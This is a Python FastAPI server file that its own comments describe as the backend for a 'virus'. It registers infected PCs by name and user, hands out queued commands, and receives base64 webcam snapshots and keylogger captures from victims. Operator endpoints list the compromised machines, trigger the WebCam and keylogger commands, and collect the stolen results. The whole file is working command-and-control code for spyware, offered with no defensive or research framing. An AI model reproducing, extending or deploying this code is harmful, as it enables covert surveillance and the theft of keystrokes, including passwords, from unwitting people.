from fastapi import FastAPI, Request

from pydantic import BaseModel

import asyncio
import base64
from os import path
import os
import json
from fastapi.responses import FileResponse

app = FastAPI()

loop = asyncio.get_event_loop()

########################  Virus funcions!!!!! ########################

# padding for the data / body in the http message
class Data(BaseModel):
    pc_name: str
    user_name: str
    day_of_month: str

# picture data in post msg
class Picture_Data(BaseModel):
    picture_content: str

# key logger data in post msg
class Key_Logger_Data(BaseModel):
    key_logger: str




# When the client / admin opens the server web.
@app.get("/")
async def start_server():
    return "Welcome to our server ^-^"



# first connection from the virus -> the way to get the pc name.
@app.post("/first_connection")
async def first_connection(data: Data):
    new_user = {
        data.pc_name: {"user_name": data.user_name, "day_of_month": data.day_of_month, "commands": []}
    }

    with open("./DB.json", "r") as file_ptr:
        file = json.load(file_ptr) ## reading the json file

        # add the new virus to the data base
        file.update(new_user)

    # write the updated file
    with open ("./DB.json", "w") as file_ptr:
        json.dump(file, file_ptr)

    # writing a file with the pc name for the client uses.
    with open("pc_name.txt", "w") as file_ptr:
        file_ptr.write(data.pc_name)

    return True # returns True to make sure everything is ok -> return that the server got the message / first connection packet



# every few minutes the virus asks for some missions / commands -> if there are no command: False is returned else the command: list.
@app.get("/command/{pc_name}")
async def give_virus_commands(pc_name: str):
    print("in get command function")
    #open the data base to check for commands for the virus
    file_ptr = open("./DB.json", "r")
    data = json.load(file_ptr) # getting the DB content
    if pc_name in data.keys():
        if len(data[pc_name]["commands"]) != 0: # if there are any commands to do
            try:
                commands = data[pc_name]["commands"][:] ## coping the list with slicing
                print(commands)
                return commands ## return the commands.
            finally:
                file_ptr.close()
                file_ptr = open("./DB.json", "w") ## opening the json file to update the commands
                data[pc_name]["commands"].clear() ## after returning them - clear them.
                json.dump(data, file_ptr) ## updating the json file with the current changes
                print(f"clear: {data[pc_name]['commands']}")
                print(f"commands sent: {commands}")

    return False # if there are no commands for the virus to do or pc_name is not exists -> return False

# getting the picture that asked
@app.post("/{pc_name}/picture")
async def give_virus_commands(pc_name: str, picture_data: Picture_Data):

    print(picture_data.picture_content)

    with open(f"transferred_picture_{pc_name}.bmp", "wb") as f:
        f.write(base64.b64decode(picture_data.picture_content))

    print('Got picture! ')

# getting the key logger that asked
@app.post("/{pc_name}/key_logger")
async def give_virus_commands(pc_name: str, key_logger_data: Key_Logger_Data):

    print(key_logger_data.key_logger)

    with open(f"transferred_key_logger_{pc_name}.txt", "w") as f:
        f.write(key_logger_data.key_logger)

    print('Got key logger! ')



########################  Client funcions!!!!! ########################


# first commit from the client to get the pc name that the virus is in.
@app.get("/first_commit")
async def first_connection():

    # sending the client the pc names in the DB
    lst_pc_names = []
    with open("DB.json", "r") as file_ptr:
        file = json.load(file_ptr) ## reading the json file

        for key, value in file.items():
            lst_pc_names.append(key)
            print(lst_pc_names)
        return (f"pc names: | >> {(' << | >> ').join(lst_pc_names)} << |")



# if the client wants to take a picture
@app.get("/{pc_name}/take_picture")
async def take_picture(pc_name: str):

    with open("DB.json", "r") as file_ptr:
        file = json.load(file_ptr) ## reading the json file

    ## add web cam command if not exists.
    if "WebCam" not in file[pc_name]["commands"]:
        file[pc_name]["commands"].append("WebCam")

    with open ("DB.json", "w") as file_ptr:
        json.dump(file, file_ptr)
    print("pro picture")
    # waiting for the photo to come back
    while True:
        if path.exists(f"transferred_picture_{pc_name}.bmp"):
            try:
                # copying the picture content and removing the main picture.
                with open(f"transferred_picture_{pc_name}.bmp", "rb") as file_ptr:
                    with open("temp_picture.bmp", "wb") as temp_file_ptr:
                        temp_file_ptr.write(file_ptr.read())
                return FileResponse("temp_picture.bmp")
            finally:
                # remove the main picture.
                os.remove(f"transferred_picture_{pc_name}.bmp")

        await asyncio.sleep(5)  # sleep 5 seconds for other commands to come



# if the client wants to start the key logger function
@app.get("/{pc_name}/start_key_logger")
async def take_picture(pc_name: str):

    with open("DB.json", "r") as file_ptr:
        file = json.load(file_ptr) ## reading the json file

    ## add start key logger command if not exists.
    if "StartKeyLogger" not in file[pc_name]["commands"]:
        file[pc_name]["commands"].append("StartKeyLogger")

    with open ("DB.json", "w") as file_ptr:
        json.dump(file, file_ptr)

    return "Command added successfully! -> hf typing (:"



# if the client wants to stop the key logger function
@app.get("/{pc_name}/stop_key_logger")
async def take_picture(pc_name: str):

    with open("DB.json", "r") as file_ptr:
        file = json.load(file_ptr) ## reading the json file

    ## add stop key logger command if not exists.
    if "StopKeyLogger" not in file[pc_name]["commands"]:
        file[pc_name]["commands"].append("StopKeyLogger")

    with open ("DB.json", "w") as file_ptr:
        json.dump(file, file_ptr)

    # waiting for the key logger to come back
    while True:
        try:
            with open(f"transferred_key_logger_{pc_name}.txt") as file_ptr:
                print('founded key logger')
                data = file_ptr.read()
            #deleting the file taken
            os.remove(f"transferred_key_logger_{pc_name}.txt")
            return f"key logger taken: {data}"

        except:
            pass

        await asyncio.sleep(5)  # sleep 5 seconds for other commands to come
#king
if __name__ == '__main__':
    # starting the server
    #os.system("uvicorn App_FastAPI_Server:app --reload --port 8000")
    loop.run_forever()